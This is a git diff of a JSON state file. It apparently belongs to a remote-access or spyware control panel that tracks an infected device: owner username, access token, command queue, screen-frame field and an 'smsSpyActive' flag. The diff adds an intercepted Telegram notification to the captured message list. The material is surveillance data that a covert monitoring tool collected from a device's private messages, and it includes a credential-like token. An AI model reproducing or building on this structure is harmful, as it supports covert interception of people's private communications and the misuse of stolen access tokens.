@@ -1402,7 +1402,7 @@
     "deviceName": "HP-ZAL7SEX-3990",
     "ownerUsername": "Zal7Sex",
     "token": "78c81bc89c2169060674d81ad262f04b",
-    "lastSeen": 1776531288495,
+    "lastSeen": 1776531297616,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-18T16:45:40.573Z",
@@ -1418,6 +1418,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "⚙️ Actions Running\n\n▢ Information\n└──\n ├── workflow : Build PSKNMRC\n ├── repo     : a-up1\n ├── branch   : main\n ├── commit   : 0b8e2c8\n └── status   : Running\n\n⏳ Memuat langkah build...",
+        "time": "18/04 23:54",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776531298268
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
